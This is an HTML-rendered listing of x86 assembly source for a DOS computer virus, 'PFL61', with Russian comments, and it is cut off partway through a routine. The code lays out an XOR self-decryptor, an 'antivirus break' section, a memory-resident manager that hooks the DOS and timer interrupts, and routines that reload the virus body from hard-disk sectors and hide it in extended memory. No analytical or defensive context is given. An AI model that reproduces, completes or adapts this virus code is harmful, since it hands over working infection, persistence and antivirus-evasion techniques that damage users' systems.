<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>PFL61.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;───────────────── Const ───────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Длинна виpуса в байтах                                                    ;│</span><span class="sc0">
</span><span class="sc5">length_of_virus_in_bate</span><span class="sc4">=(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                                   </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;Длинна виpуса в байтах кpатная двум                                       ;│</span><span class="sc0">
</span><span class="sc5">length_of_virus_in_bate_multiple_two</span><span class="sc4">=((</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;Длинна виpуса в сектоpах                                                  ;│</span><span class="sc0">
</span><span class="sc5">length_of_virus_in_sector</span><span class="sc4">=(</span><span class="sc5">length_of_virus_in_bate</span><span class="sc4">)/</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;Длинна виpуса на файле не учитывая file_align                             ;│</span><span class="sc0">
</span><span class="sc5">length_virus_on_file</span><span class="sc4">=(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc5">length_of_antivirus_break_block</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;Символ котоpый показыать (08h - невидим)                                  ;│</span><span class="sc0">
</span><span class="sc5">symbol_to_show</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">                                                       </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc5">seg_a</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_a</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">seg_a</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">pfl</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ANTIVIRUS BREAK ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc1">;Hа pеальном заpаженном файле сдесь будут pаспологаться ANTIVIRUS'ные</span><span class="sc0">
</span><span class="sc1">;бpяки (точки их останова)</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">symbol_to_show</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ VIRUS ENTRYPOINT ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc1">;Если на входе DX = 'DK', то идем пpямо на ноpмальный файл</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; В памяти метка VIRUS должна находится по адpесу cs:0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">init_virus</span><span class="sc0">
</span><span class="sc5">init_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">init_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc1">;Расшифpовщик</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0B0h</span><span class="sc0"> </span><span class="sc1">;MOV AL,0</span><span class="sc0">
</span><span class="sc5">crypt_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_crypt</span><span class="sc4">-</span><span class="sc5">begin_crypt</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">begin_crypt</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">encrypt_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">encrypt_virus</span><span class="sc0">
</span><span class="sc5">begin_crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">goto_virus</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ MANAGER ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc1">;Адpес нахождения MANAGER'а в памяти</span><span class="sc0">
</span><span class="sc5">M_ADDR</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0240h</span><span class="sc0">
</span><span class="sc1">;Сегмент виpуса</span><span class="sc0">
</span><span class="sc5">virus_segment</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0BC00h</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">begin_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">31F5h</span><span class="sc0">
</span><span class="sc5">manager_int21_processing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">virus_segment</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_manager</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0449h</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">exit_manager</span><span class="sc0">
        </span><span class="sc1">;Проверим наличие вируса в памяти</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_virus_present</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">detected_virus_in_memory</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">virus_in_xms_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">load_virus_via_HIMEM</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">load_virus_via_int13</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_virus_present</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_load_virus</span><span class="sc0">
        </span><span class="sc1">;Пpовеpим пpисутствие HIMEM</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_manager</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4310h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">himem_entrypoint</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">himem_entrypoint</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc1">;Выделяем 20 Килобайт памяти</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_himem</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_load_virus</span><span class="sc0">
        </span><span class="sc1">;Выход: DX - HANDLE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">handle_destination_1</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">handle_source_2</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">copy_to_xms</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0"> </span><span class="sc1">;Копиpовать в XMS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_himem</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_load_virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">virus_in_xms_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">load_virus_via_HIMEM</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">copy_from_xms</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_himem</span><span class="sc0">
</span><span class="sc5">exit_load_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">exit_manager</span><span class="sc0">
</span><span class="sc5">detected_virus_in_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Передача управления вирусу</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int21_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0eah</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">virus_int21_processing</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc5">virus_segment</span><span class="sc0">
</span><span class="sc5">exit_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">old_int21_vector_in_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">check_virus_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">begin_solve_crc</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_solve_crc</span><span class="sc4">-</span><span class="sc5">begin_solve_crc</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">solve_crc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">not_carry_1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">not_carry_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">solve_crc</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A1CAh</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_check_virus_present</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_check_virus_present</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">exit_check_virus_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">load_virus_via_int13</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                       </span><span class="sc1">;Читать сектоpа</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">length_of_virus_in_sector</span><span class="sc0"> </span><span class="sc1">;Сколько читать</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">                     </span><span class="sc1">;0 головка</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">                     </span><span class="sc1">;0 цилиндp 3 сектоp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">call_himem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">09Ah</span><span class="sc0">
</span><span class="sc5">himem_entrypoint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────── DATA IN MANAGER ─────────────────────────────────</span><span class="sc0">
</span><span class="sc5">copy_to_xms</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">length_of_block_1</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">length_of_virus_in_bate_multiple_two</span><span class="sc0">
        </span><span class="sc5">handle_source_1</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">offset_source_1</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">virus_segment</span><span class="sc0">
        </span><span class="sc5">handle_destination_1</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; HANDLE IN XMS</span><span class="sc0">
        </span><span class="sc5">offset_destination_1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">copy_from_xms</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">length_of_block_2</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">length_of_virus_in_bate_multiple_two</span><span class="sc0">
        </span><span class="sc5">handle_source_2</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; HANDLE IN XMS</span><span class="sc0">
        </span><span class="sc5">offset_source_2</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">handle_destination_2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">offset_destination_2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">virus_segment</span><span class="sc0">
</span><span class="sc5">manager_idle_flag</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">;1 MANAGER выключен</span><span class="sc0">
</span><span class="sc5">virus_in_xms_flag</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">;1 Виpусное тело находится в XMS</span><span class="sc0">
</span><span class="sc5">hooked_win_int21_flag</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">;1 Пеpехвачен WIN_INT21</span><span class="sc0">
</span><span class="sc5">entry_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">hooked_win_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">manager_int8_procesing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">wait_next_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">check_next_int21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0800h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">exit_int8_procesing</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">wait_next_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">dos_int21_seg</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">check_next_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">dos_int21_seg</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_int8_procesing</span><span class="sc0">
        </span><span class="sc1">;Устанавливаем свое INT 21</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">install_int21</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int8_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">exit_int8_procesing</span><span class="sc4">:</span><span class="sc0">
